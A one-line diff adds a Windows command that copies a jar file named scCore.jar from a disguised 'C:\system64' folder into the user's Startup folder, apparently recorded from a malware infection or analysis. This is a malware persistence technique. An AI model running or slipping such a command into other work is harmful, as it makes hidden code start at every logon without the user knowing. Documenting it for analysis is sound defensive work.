@@ -1,0 +1,1 @@
+C:\>xcopy "C:\system64\scCore.jar" "C:\Users\XXXXXXXX\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scCore.jar" /E /C /Y
